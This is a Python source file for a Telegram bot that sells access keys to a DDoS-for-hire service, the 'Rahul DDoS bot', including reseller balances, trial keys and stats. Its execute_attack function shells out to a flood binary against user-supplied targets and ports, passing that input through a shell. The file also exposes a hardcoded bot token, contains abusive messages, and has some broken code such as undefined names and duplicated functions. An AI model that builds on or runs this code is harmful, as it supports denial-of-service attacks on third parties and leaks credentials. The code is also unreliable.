import time
import asyncio
import py_compile
import sys
import ast
import py_compile
import sys
import ast
import astor
import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
import pytz
import shutil
from telebot import formatting
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re
import html
import asyncio

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone("Asia/Kolkata")
timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')

# Define file paths and directories at the top
DATA_DIR = "data"
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
USER_FILE = os.path.join(DATA_DIR, "users.json")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
MAX_BACKUPS = 5
TRIAL_DATA_FILE = os.path.join(DATA_DIR, "trial_data.json")
GLOBAL_DATA_FILE = os.path.join(DATA_DIR, "global_data.json")



# Initialize directories and files
def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a').close()

# Call initialize_system early
initialize_system()

def log_action(user_id, username, command, details="", response="", error=""):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Command: {command}\n"
        f"Details: {details}\n"
        f"Response: {response}\n"
    )
    if error:
        log_entry += f"Error: {error}\n"
    log_entry += "----------------------------------------\n"
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def auto_astor_analysis():
    try:
        filename = os.path.abspath(__file__)
        with open(filename, "r", encoding="utf-8") as f:
            source_code = f.read()

        tree = ast.parse(source_code)
        reconstructed_code = astor.to_source(tree)

        output_path = os.path.join(os.path.dirname(filename), "_reconstructed.py")
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(reconstructed_code)

        now = datetime.datetime.now(IST)
        log_action(
            "SYSTEM", "SYSTEM", "ASTOR Auto Analysis",
            f"AST parsed and reconstructed successfully. Saved to: {output_path}",
            f"Completed on {now.strftime('%Y-%m-%d %I:%M:%S %p')}"
        )

    except Exception as e:
        log_action(
            "SYSTEM", "SYSTEM", "ASTOR Auto Analysis Error",
            "Failed to parse and reconstruct the AST",
            str(e)
        )

# Trigger AST auto-analysis after initialization
auto_astor_analysis()

# Attempt auto-fix using autopep8 and log via bot's log_action()
try:
    import autopep8
    filename = os.path.abspath(__file__)
    with open(filename, 'r', encoding='utf-8') as f:
        source = f.read()
    fixed_code = autopep8.fix_code(source, options={'aggressive': 2})
    if source != fixed_code:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(fixed_code)
        try:
            now = datetime.datetime.now(IST)
            log_msg = f"[{now.strftime('%Y-%m-%d %I:%M:%S %p')}] Auto-fixed Rohan.py using autopep8 and restarted.\n"
            with open("data/log.txt", "a", encoding="utf-8") as log_file:
                log_file.write(log_msg)
        except Exception as log_error:
            print("Auto-fix log error:", log_error)
        print("Autopep8 fixed code. Restarting bot...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
except ImportError:
    print("autopep8 not installed. Run: pip install --user --break-system-packages autopep8")

# Telegram bot token
bot = telebot.TeleBot('7564493380:AAFgbmSZ8zrHIpyQkJGwXMfjhaBONvjBSy4')

# Configure retries for Telegram API requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
bot.session = session  # Attach the session with retries to the bot

# Overlord IDs and usernames (fixed)
overlord_id = {"1807014348", "6258297180"}
overlord_usernames = {"@sadiq9869", "@rahul_618"}

# Dynamic admin IDs and usernames (loaded from file)
admin_id = set()
admin_usernames = set()

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}  # Stores user_id: {expiration, context}
keys = {}   # Stores key: {duration, device_limit, devices, blocked, context}
global_data = {}
TRIAL_COOLDOWN_SECONDS = 2 * 24 * 60 * 60  # 2 days = 172800 seconds
trial_data = {}
cooldown_data = {}
authorized_users = {}
last_attack_time = {}
active_attacks = {}
COOLDOWN_PERIOD = 20  # Cooldown removed as per March 05, 2025
resellers = {}

# Stats tracking
bot_start_time = datetime.datetime.now(IST)  # For uptime calculation
stats = {
    "total_keys": 0,
    "active_attacks": 0,
    "total_users": set(),
    "active_users": [],  # Changed from set() to list
    "key_gen_timestamps": [],
    "redeemed_keys": 0,
    "total_attacks": 0,
    "attack_durations": [],
    "expired_keys": 0,
    "peak_active_users": 0,
    "command_usage": {
        "start": 0, "help": 0, "genkey": 0, "attack": 0,
        "listkeys": 0, "myinfo": 0, "redeem": 0, "stats": 0,
        "addadmin": 0, "removeadmin": 0, "checkadmin": 0,
        "addreseller": 0, "balance": 0, "block": 0, "add": 0,
        "logs": 0, "users": 0, "remove": 0, "resellers": 0,
        "addbalance": 0, "removereseller": 0, "setcooldown": 0,
        "checkcooldown": 0, "uptime": 0  # Added for new uptime command
    }
}

# Compulsory message with enhanced UI
COMPULSORY_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "<b>🔥 SCAM ALERT! 🔥</b>\n"
    "<i>Agar koi bhi Rahul DDoS bot ka key kisi aur se kharidta hai, toh kisi bhi scam ka koi responsibility nahi! 😡</i>\n"
    "<b>✅ Sirf @Rahul_618 se key lo – yeh hai Trusted Dealer! 💎</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━"
)

# Initialize directory and files
def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a').close()

# Reset a JSON file to its default state if corrupted
def reset_json_file(file_path, default_data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(default_data, f, indent=4)
    log_action("SYSTEM", "SYSTEM", "Reset JSON File", f"File: {file_path}, Reset to: {default_data}", "File reset due to corruption")

# Load and validate data with expire check
def load_data():
    global keys, users, logs, trial_data, global_data
    if not os.path.exists("data.json"):
        with open("data.json", "w", encoding="utf-8") as f:
            json.dump({
                "keys": {},
                "users": {},
                "logs": [],
                "trial_data": {},
                "global_data": {}
            }, f, indent=4)


    global keys, users, logs, trial_data, global_data
    with open('data.json', 'r') as f:
        data = json.load(f)
        keys = data.get("keys", {})
        users = data.get("users", {})
        logs = data.get("logs", [])
        trial_data = data.get("trial_data", {})
        global_data = data.get("global_data", {})

    global authorized_users, resellers, admin_id, admin_usernames, stats, COOLDOWN_PERIOD
    initialize_system()
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Load users and authorized users
            for file in [USER_FILE, AUTHORIZED_USERS_FILE]:
                with open(file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if not isinstance(data, dict):
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {file}, Invalid data type: {type(data)}", "Resetting file")
                        reset_json_file(file, {})
                        data = {}
                    for uid, info in list(data.items()):
                        try:
                            exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                            if datetime.datetime.now(IST) > exp_date:
                                del data[uid]
                                stats["expired_keys"] += 1
                            else:
                                data[uid] = info
                                stats["total_users"].add(uid)
                        except (ValueError, KeyError):
                            del data[uid]
                    if file == USER_FILE:
                        users = data
                    else:
                        authorized_users = data

            # Load keys
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
                if not isinstance(keys_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {KEY_FILE}, Invalid data type: {type(keys_data)}", "Resetting file")
                    reset_json_file(KEY_FILE, {})
                    keys_data = {}
                for key_name, key_info in list(keys_data.items()):
                    try:
                        generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                        minutes, hours, days, months = parse_duration(key_info["duration"])
                        expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)

                        if expiration_time.year > datetime.datetime.now(IST).year + 5:
                            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Key: {key_name}, Invalid expiration year: {expiration_time.year}", "Skipping key")
                            del keys_data[key_name]
                            stats["expired_keys"] += 1
                            continue

                        if datetime.datetime.now(IST) > expiration_time and not key_info.get("blocked", False):
                            del keys_data[key_name]
                            stats["expired_keys"] += 1
                        else:
                            keys_data[key_name] = key_info
                            stats["total_keys"] += 1
                            stats["key_gen_timestamps"].append(generated_time)
                    except (ValueError, KeyError) as e:
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Key: {key_name}, Error: {str(e)}", "Skipping key")
                        del keys_data[key_name]
                        stats["expired_keys"] += 1
                keys = keys_data

            # Load resellers
            with open(RESELLERS_FILE, 'r', encoding='utf-8') as f:
                resellers_data = json.load(f)
                if not isinstance(resellers_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {RESELLERS_FILE}, Invalid data type: {type(resellers_data)}", "Resetting file")
                    reset_json_file(RESELLERS_FILE, {})
                    resellers_data = {}
                resellers = resellers_data

            # Load cooldown
            with open(COOLDOWN_FILE, 'r', encoding='utf-8') as f:
                cooldown_data = json.load(f)
                if not isinstance(cooldown_data, dict) or "cooldown" not in cooldown_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {COOLDOWN_FILE}, Invalid data: {cooldown_data}", "Resetting file")
                    reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                    cooldown_data = {"cooldown": 0}
                COOLDOWN_PERIOD = cooldown_data.get("cooldown", 0)

            # Load admins
            with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
                admin_data = json.load(f)
                if not isinstance(admin_data, dict) or "ids" not in admin_data or "usernames" not in admin_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {ADMIN_FILE}, Invalid data: {admin_data}", "Resetting file")
                    reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                    admin_data = {"ids": [], "usernames": []}
                admin_id = set(admin_data.get("ids", []))
                admin_usernames = set(admin_data.get("usernames", []))

            # Load trial data
            if os.path.exists(TRIAL_DATA_FILE):
                with open(TRIAL_DATA_FILE, 'r', encoding='utf-8') as f:
                    trial_data = json.load(f)
            else:
                trial_data = {}

            # Load global data
            if os.path.exists(GLOBAL_DATA_FILE):
                with open(GLOBAL_DATA_FILE, 'r', encoding='utf-8') as f:
                    global_data = json.load(f)
            else:
                global_data = {}

            print(f"Data loaded successfully. Keys: {list(keys.keys())}, Admins: {admin_id}")
            break

        except (FileNotFoundError, json.JSONDecodeError) as e:
            retry_count += 1
            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Error: {str(e)}, Retry: {retry_count}/{max_retries}", "Attempting to restore from backup")
            print(f"Corruption detected in {e}, attempting to restore from backup (Retry {retry_count}/{max_retries}).")
            restore_from_backup()

            if retry_count == max_retries:
                log_action("SYSTEM", "SYSTEM", "Load Data Failure", f"Error: {str(e)}, Max retries reached", "Resetting all files to default")
                reset_json_file(USER_FILE, {})
                reset_json_file(AUTHORIZED_USERS_FILE, {})
                reset_json_file(KEY_FILE, {})
                reset_json_file(RESELLERS_FILE, {})
                reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                users = {}
                authorized_users = {}
                keys = {}
                resellers = {}
                COOLDOWN_PERIOD = 0
                admin_id = set()
                admin_usernames = set()
                trial_data = {}
                global_data = {}
                print("Max retries reached, reset all data to default.")
                break

def save_data():
    # Save combined data
    with open('data.json', 'w', encoding='utf-8') as f:
        json.dump({
            "keys": keys,
            "users": users,
            "logs": logs,
            "trial_data": trial_data,
            "global_data": global_data
        }, f, indent=4)

    # Save each component to its own file
    with open(USER_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

    with open(AUTHORIZED_USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(authorized_users, f, indent=4)

    with open(KEY_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys, f, indent=4)

    with open(RESELLERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(resellers, f, indent=4)

    with open(COOLDOWN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"cooldown": COOLDOWN_PERIOD}, f, indent=4)

    with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
        json.dump({
            "ids": list(admin_id),
            "usernames": list(admin_usernames)
        }, f, indent=4)

    # Save trial and global data
    with open(TRIAL_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(trial_data, f, indent=4)
    with open(GLOBAL_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(global_data, f, indent=4)

    print("All data saved successfully.")

def create_backup():
    backup_time = datetime.datetime.now(IST).strftime('%Y-%m-%d_%I-%M-%S_%p')
    backup_dir = os.path.join(BACKUP_DIR, f"backup_{backup_time}")
    os.makedirs(backup_dir)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE]:
        shutil.copy2(file, os.path.join(backup_dir, os.path.basename(file)))
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if len(backups) > MAX_BACKUPS:
        oldest_backup = min(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        shutil.rmtree(os.path.join(BACKUP_DIR, oldest_backup))

def restore_from_backup():
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if backups:
        latest_backup = max(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        backup_path = os.path.join(BACKUP_DIR, latest_backup)
        for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE]:
            src = os.path.join(backup_path, os.path.basename(file))
            if os.path.exists(src):
                shutil.copy2(src, file)
        log_action("SYSTEM", "SYSTEM", "Restore Backup", f"Restored from: {backup_path}", "Backup restored successfully")
    else:
        log_action("SYSTEM", "SYSTEM", "Restore Backup", "No backups found", "Failed to restore, no backups available")

def is_overlord(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in overlord_id or username in overlord_usernames)

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in admin_id or username in admin_usernames or is_overlord(user_id, username))

def has_valid_context(user_id, chat_type):
    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp_date:
                return user_info.get('context') == chat_type
        except (ValueError, KeyError):
            return False
    return False

def append_compulsory_message(response):
    return f"{response}\n\n{COMPULSORY_MESSAGE}"

def safe_reply(bot, message, text, parse_mode="HTML"):
    try:
        text_with_compulsory = append_compulsory_message(text)
        bot.send_message(message.chat.id, text_with_compulsory, parse_mode=parse_mode)
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Message not found: chat_id={message.chat.id}, message_id={message.message_id}, user_id={message.from_user.id}, text={text}\n")
            bot.send_message(message.chat.id, append_compulsory_message(text), parse_mode="HTML")
        else:
            log_error(f"Error in safe_reply: {str(e)}", message.from_user.id, message.from_user.username)
            raise e

def log_error(error_message, user_id, username):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Error: {error_message}\n"
        "----------------------------------------\n"
    )
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)
        
def get_admin_reset_limit():
    try:
        if os.path.exists(LOG_NOTIFY_FILE):
            with open(LOG_NOTIFY_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data.get("admin_reset_limit", 2)
    except:
        pass
    return 2

def can_reset_trial(user_id):
    today = datetime.now(IST).strftime("%Y-%m-%d")
    resets = {}

    if os.path.exists(LOG_NOTIFY_FILE):
        try:
            with open(LOG_NOTIFY_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                resets = data.get("trial_resets", {})
        except:
            pass

    user_resets = resets.get(str(user_id), {})
    if user_resets.get("date") == today:
        if user_resets.get("count", 0) >= get_admin_reset_limit() and not is_overlord(user_id):
            return False
    return True

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open(COOLDOWN_FILE, "w") as file:
        json.dump({"cooldown": seconds}, file)

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return 0, 0, 0, 0  # Return zeros instead of None to avoid errors
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return 0, 0, 0, 0
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return 0, 0, 0, 0

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Stats utility functions
def calculate_uptime():
    uptime = datetime.datetime.now(IST) - bot_start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def calculate_keys_per_minute():
    current_time = datetime.datetime.now(IST)
    one_minute_ago = current_time - datetime.timedelta(minutes=1)
    recent_keys = [ts for ts in stats["key_gen_timestamps"] if ts >= one_minute_ago]
    return len(recent_keys)

def calculate_avg_attack_duration():
    if not stats["attack_durations"]:
        return "0s"
    avg_duration = sum(stats["attack_durations"]) / len(stats["attack_durations"])
    return f"{int(avg_duration)}s"

def update_active_users():
    current_time = datetime.datetime.now(IST)
    stats["active_users"] = [user for user in stats["active_users"] if (current_time - user["last_active"]).total_seconds() < 300]
    return len(stats["active_users"])
    
@bot.message_handler(commands=['settrialresetlimit'])
def set_trial_reset_limit(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    chat_id = message.chat.id

    if not is_overlord(user_id, username):
        response = "🚫 <b>Access Denied:</b> Only overlords can set trial reset limits."
        safe_reply(bot, message, response)
        log_action(user_id, username, "/settrialresetlimit", "", response)
        return

    parts = message.text.strip().split()
    if len(parts) != 2 or not parts[1].isdigit():
        response = "❗️ <b>Usage:</b> /settrialresetlimit <count>\nExample: /settrialresetlimit 3"
        safe_reply(bot, message, response)
        return

    limit = int(parts[1])
    if limit < 1 or limit > 10:
        response = "⚠️ <b>Invalid limit:</b> Please choose between 1 and 10 resets per day."
        safe_reply(bot, message, response)
        return

    data = {}
    if os.path.exists(LOG_NOTIFY_FILE):
        try:
            with open(LOG_NOTIFY_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except:
            pass

    data["admin_reset_limit"] = limit
    with open(LOG_NOTIFY_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

    response = f"✅ <b>Admin trial reset limit set to:</b> <code>{limit}</code> resets/day"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/settrialresetlimit", f"New limit: {limit}", response)
    
@bot.message_handler(commands=['trial'])
def handle_trial(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"User_{user_id}"
    now = datetime.datetime.now()
    timestamp = time.time()

    trial_key = "Rahul_sadiq-Trial"
    duration = 3600  # 1 hour trial
    hour = now.hour
    slot = "subha" if 5 <= hour < 17 else "raat"
    today = now.strftime("%Y-%m-%d")

    # Load usage data
    data = global_data.get("trial_usage", {"slots": {}, "cooldown_until": 0})
    active_key = keys.get(trial_key)
    is_active = active_key and active_key.get("expiry", 0) > timestamp

    # If active key exists, show it
    if is_active:
        remaining = int(active_key["expiry"] - timestamp)
        mins = remaining // 60
        safe_reply(bot, message,
            f"<b><i>🔑 Trial key already active:</i></b>\n<code><b><i>{trial_key}</i></b></code>\n⏳ <b>{mins} minutes left</b>",
            parse_mode="HTML")
        return

    # Check cooldown
    if timestamp < data.get("cooldown_until", 0):
        remaining = int(data["cooldown_until"] - timestamp)
        days = remaining // 86400
        hours = (remaining % 86400) // 3600
        safe_reply(bot, message,
            f"❌ Trial cooldown active.\n⏳ Try again in <b>{days}d {hours}h</b>.",
            parse_mode="HTML")
        return

    # Slot already used today?
    if data["slots"].get(today, {}).get(slot):
        safe_reply(bot, message,
            f"⚠️ Trial already used for <b>{slot}</b> today.",
            parse_mode="HTML")
        return

    # Create and register new trial key
    keys[trial_key] = {
        "duration": duration,
        "created": timestamp,
        "expiry": timestamp + duration,
        "creator": user_id,
        "creator_username": username,
        "device_limit": "∞",
        "used_by": [],
        "universal": True,
        "trial": True,
        "slot": slot
    }

    # Mark slot used
    data["slots"].setdefault(today, {})[slot] = True

    # If both slots used, trigger 2-day cooldown
    if len(data["slots"][today]) >= 2:
        data["cooldown_until"] = timestamp + 2 * 86400

    global_data["trial_usage"] = data
    save_data()

    # Reply and log
    safe_reply(bot, message,
        f"<b><i>✅ {slot} trial key generated!</i></b>\n<code><b><i>{trial_key}</i></b></code>\n⏳ <b>Valid for 1 hour.</b>",
        parse_mode="HTML")
    log_action(user_id, username, "/trial", f"Generated {slot} trial", trial_key)
    
async def auto_cleanup():
    while True:
        now = time.time()
        expired_keys = [k for k, v in keys.items() if v.get("expiry", 0) < now]
        for key in expired_keys:
            del keys[key]
        save_data()
        await asyncio.sleep(60)

# Live Stats Dashboard for Overlord
def live_stats_update(chat_id, message_id):
    while True:
        active_users = update_active_users()
        active_keys = len([
            key for key, info in keys.items()
            if not info.get("blocked", False)
            and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60
        ])
        command_usage_str = "\n".join([f"📜 <b>/{cmd}</b>: <i>{count}</i>" for cmd, count in stats["command_usage"].items()])
        memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02  # Simulated memory usage in MB

        # Trial Status
        trial_info = global_data.get("trial_usage", {})
        trial_key = keys.get("trial")
        trial_active = trial_key and trial_key.get("expiry", 0) > time.time()

        if trial_active:
            remaining = int(trial_key["expiry"] - time.time())
            mins = remaining // 60
            trial_status = f"🟢 Active ({mins} min left)"
        else:
            cooldown = trial_info.get("cooldown_until", 0)
            if time.time() < cooldown:
                cooldown_in = int((cooldown - time.time()) // 3600)
                trial_status = f"⏸️ Cooldown ({cooldown_in}h left)"
            else:
                trial_status = "⚪️ Available"

        response = (
            f"🌌 <b>COSMIC LIVE STATS (OVERLORD)</b> 🌌\n"
            f"<b>🔥 Bhai Overlord, ye hai live data! 🔥</b>\n"
            f"<b>🔑 Total Keys:</b> <i>{stats['total_keys']}</i>\n"
            f"<b>💥 Active Attacks:</b> <i>{stats['active_attacks']}</i>\n"
            f"<b>👥 Total Users:</b> <i>{len(stats['total_users'])}</i>\n"
            f"<b>👤 Active Users (Last 5 min):</b> <i>{active_users}</i>\n"
            f"<b>🔑 Keys Generated/min:</b> <i>{calculate_keys_per_minute()}</i>\n"
            f"<b>🔓 Total Redeemed Keys:</b> <i>{stats['redeemed_keys']}</i>\n"
            f"<b>⏳ Bot Uptime:</b> <i>{calculate_uptime()}</i>\n"
            f"<b>💥 Total Attacks Launched:</b> <i>{stats['total_attacks']}</i>\n"
            f"<b>⏱️ Avg Attack Duration:</b> <i>{calculate_avg_attack_duration()}</i>\n"
            f"<b>❌ Total Expired Keys:</b> <i>{stats['expired_keys']}</i>\n"
            f"<b>🔑 Active Keys:</b> <i>{active_keys}</i>\n"
            f"<b>🧪 Trial Key Status:</b> <i>{trial_status}</i>\n"
            f"<b>👥 Peak Active Users:</b> <i>{stats['peak_active_users']}</i>\n"
            f"<b>⚙️ Memory Usage (Simulated):</b> <i>{memory_usage:.2f}MB</i>\n"
            f"<b>📊 Command Usage Stats:</b>\n{command_usage_str}\n"
            f"<b>📅 Last Updated:</b> <i>{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i>\n"
            f"<code>nebula> overlord_stats\nstatus: RUNNING 🚀</code>\n"
            f"<b>⚡️ Cosmic power unleashed! ⚡️</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

        try:
            bot.edit_message_text(append_compulsory_message(response), chat_id, message_id, parse_mode="HTML")
        except telebot.apihelper.ApiTelegramException as e:
            log_error(f"Stats update error: {str(e)}", "system", "system")
            break
        time.sleep(10)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    if active_attacks.get(user_id, False):
        response = "🚫 <b>BSDK, ruk ja warna gaand mar dunga teri!</b> <i>Ek attack chal raha hai, dusra mat try kar!</i>" if not is_admin(user_id, username) else "👑 <b>Kripya karke BGMI ko tazi sa na choda!</b> <i>Ek attack already chal raha hai, wait karo.</i>"
        safe_reply(bot, chat_id, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return
    try:
        packet_size = 1367
        if packet_size < 1 or packet_size > 65507:
            response = "🚫 <b>Error:</b> <i>Packet size must be between 1 and 65507</i>"
            bot.send_message(chat_id, response, parse_mode="HTML")
            log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
            return
        full_command = f"./Rohan {target} {port} {time} 1367"
        response = (
            f"💥 <b>Attack Sent Successfully</b> 💥\n"
            f"<b>Target:</b> <i>{target}:{port}</i>\n"
            f"<b>Time:</b> <i>{time} seconds</i>\n"
            f"<b>Packet Size:</b> <i>{packet_size} bytes</i>\n"
            f"<b>Threads:</b> <i>1200</i>\n"
            f"<b>Attacker:</b> <i>@{username}</i>\n"
            f"<b>Join VIP DDoS:</b> <i>https://t.me/devil_ddos</i>\n"
            f"━━━━━━━"
        )
        bot.send_message(chat_id, response, parse_mode='HTML')
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, lambda: send_attack_finished_message(chat_id), []).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
        active_attacks[user_id] = True
        stats["active_attacks"] += 1
        stats["total_attacks"] += 1
        stats["attack_durations"].append(time)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}, Packet Size: {packet_size}, Threads: 1200", response)
    except Exception as e:
        response = f"🚫 <b>Error executing attack:</b> <i>{str(e)}</i>"
        bot.send_message(chat_id, response, parse_mode="HTML")
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response, str(e))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]
            stats["active_attacks"] -= 1

def send_attack_finished_message(chat_id):
    response = "✅ <b>Attack completed</b> ✅"
    bot.send_message(chat_id, response, parse_mode="HTML")

@bot.message_handler(commands=['checkkey'])
def handle_check_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "Unknown"
    stats["command_usage"].setdefault("checkkey", 0)
    stats["command_usage"]["checkkey"] += 1

    parts = message.text.strip().split()
    if len(parts) != 2:
        safe_reply(bot, message, "📌 <b>Usage:</b> <code>/checkkey Rahul_sadiq-keyname</code>\n<b>Example:</b> <code>/checkkey Rahul_sadiq-rahul</code>", parse_mode="HTML")
        return

    key_name = parts[1]
    if key_name not in keys:
        safe_reply(bot, message, f"❌ <b>Key not found:</b> <code>{key_name}</code>\n🔑 Buy only from <b>@Rahul_618</b> to avoid scams.", parse_mode="HTML")
        return

    key = keys[key_name]
    device_limit = "Unlimited" if key["device_limit"] == float('inf') else key["device_limit"]
    used_devices = key.get("devices", [])
    blocked = key.get("blocked", False)
    blocked_by = key.get("blocked_by_username", "N/A")
